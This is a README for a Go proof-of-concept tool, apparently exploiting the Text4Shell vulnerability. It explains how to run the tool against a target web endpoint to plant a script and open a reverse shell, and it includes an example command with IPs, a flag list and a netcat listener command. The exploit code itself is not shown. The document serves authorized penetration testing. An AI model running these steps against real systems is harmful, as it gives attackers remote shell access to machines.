# Text4shell script in go

This Go script provides a proof of concept for a reverse shell attack. It creates a shell script and serves it to a target machine through a vulnerable web server. The script is designed to be used in a controlled and authorized environment for educational or penetration testing purposes only.

## Usage

1. Clone the repository:

```bash
   git clone <repository_url>
   cd <repository_directory>
```
2. Run the script

```bash
Example: ./text4shell --ip 192.168.204.150 --port 8080 --endpoint /search --parameter query  --local-ip 192.168.45.226 --local-port 4444

./text4shell --ip <target_ip> --port <target_port> --endpoint <target_endpoint> --parameter <injection_parameter> --local-ip <your_ip> --local-port <your_port>

Replace <target_ip>, <target_port>, <target_endpoint>, <injection_parameter>, <your_ip>, and <your_port> with the appropriate values.

Follow the prompts to save the script on the target and initiate the reverse shell.

```

3. Optional, build the binary

In case you wan to make some changes to the script, make your changes and compile

```bash
go build main.go
```

## Flags

```
--ip: Target URL including the parameter to inject.
--port: Port where the target application is running (default: 8000).
--endpoint: Endpoint to target.
--parameter: Parameter to inject payload.
--local-ip: IP to listen on for the reverse shell.
--local-port: Port to listen on for the reverse shell (default: 4444).

```

## Reverse Shell

The script creates a reverse shell connection to your machine. To interact with the shell:

Start a netcat listener on your machine:

```bash
nc -lvnp <your_port>
```

## Disclaimer

This script is for educational and authorized penetration testing purposes only. Use it responsibly and in compliance with applicable laws and regulations.
